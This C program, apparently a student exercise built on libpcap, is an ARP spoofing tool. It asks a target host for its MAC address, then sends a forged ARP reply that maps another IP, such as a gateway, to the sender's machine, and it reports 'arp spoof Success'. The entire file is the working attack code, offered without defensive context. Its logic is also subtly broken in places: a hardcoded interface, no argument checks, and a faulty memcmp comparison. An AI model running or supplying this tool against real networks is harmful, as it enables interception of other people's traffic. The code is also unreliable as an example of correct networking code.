#include <pcap.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>

void usage() {
  printf("syntax: pcap_test <interface>\n");
  printf("sample: pcap_test wlan0\n");
}

struct arp{
	unsigned char des_mac[6];
	unsigned char src_mac[6];
	uint16_t e_type=0x0608;
	uint16_t a_type=0x0100;
	uint16_t p_type=0x0008;
	uint8_t h_size=0x06;
	uint8_t p_size=0x04;
	uint16_t opcode;
	unsigned char src_mac2[6];
	uint32_t *src_ip;
	unsigned char des_mac2[6];
	uint32_t *des_ip;

};

struct arp getmac(struct arp s_arp){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(s.ifr_name, "eth0");
    ioctl(fd, SIOCGIFHWADDR, &s);
    int i =0;
    for (i = 0; i < 6; ++i){
    s_arp.src_mac[i]=(unsigned char)s.ifr_addr.sa_data[i];
    }
    puts("\n");
    return s_arp;
}

int getIpAddress (const char * ifr, uint32_t *src_ip) {  
    int sockfd;  
    struct ifreq ifrq;  
    struct sockaddr_in * sin;  
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);  
    strcpy(ifrq.ifr_name, ifr);  
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {  
        perror( "ioctl() SIOCGIFADDR error");  
        return -1;  
    }  
    sin = (struct sockaddr_in *)&ifrq.ifr_addr;  
    memcpy (src_ip, (void*)&sin->sin_addr, sizeof(sin->sin_addr));  
    close(sockfd);  
  
    return 4;  
}
void input_packet(const u_char* packet,struct arp s_arp){
  memcpy((unsigned char *)packet,s_arp.des_mac,28);
  memcpy((unsigned char *)packet+28,s_arp.src_ip,4);
  memcpy((unsigned char *)packet+32,s_arp.des_mac2,6);
  memcpy((unsigned char *)packet+38,s_arp.des_ip,4);
}


int main(int argc, char* argv[]) {
  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  struct pcap_pkthdr* header;
  const u_char* packet;
  const u_char* packet2;
  struct arp s_arp;
  int res;
  unsigned char c_mac[6];
  unsigned char c_ip[4];
 
  packet = (const u_char*) malloc(42); 
  s_arp.src_ip = (uint32_t*)malloc(40);
  s_arp.des_ip = (uint32_t*)malloc(40);

  s_arp = getmac(s_arp);
  getIpAddress(argv[1],s_arp.src_ip);
  memcpy(s_arp.des_mac,"\xff\xff\xff\xff\xff\xff",6);
  memcpy(s_arp.des_mac2,"\x00\x00\x00\00\x00\x00",6);
  memcpy(s_arp.src_mac2,s_arp.src_mac,6);
  s_arp.opcode=0x0100;
  inet_pton(AF_INET,argv[3],s_arp.des_ip);
  input_packet(packet,s_arp);
  pcap_sendpacket(handle,packet,42);
  while(true){
  	res = pcap_next_ex(handle, &header, &packet2);	
	if (res == 0) continue;
    	if (res == -1 || res == -2) break;
	memcpy(c_ip,(unsigned char *)packet2+28,4);
	memcpy(c_mac,(unsigned char *)packet2+22,6);
	if(memcmp((char *)c_ip,(char *)s_arp.des_ip,6)!=-1){
		printf("GET MAC \n");
		break;
	}else{
		continue;
	}
  }
  s_arp.opcode=0x0200;
  memcpy(s_arp.des_mac,c_mac,6);
  memcpy(s_arp.des_mac2,c_mac,6);
  inet_pton(AF_INET,argv[2],s_arp.src_ip);
  input_packet(packet,s_arp);
  pcap_sendpacket(handle,packet,42);

  free((void *)packet);
  free(s_arp.src_ip);
  free(s_arp.des_ip);
  pcap_close(handle);
  printf("arp spoof Success\n");
  return 0;
}
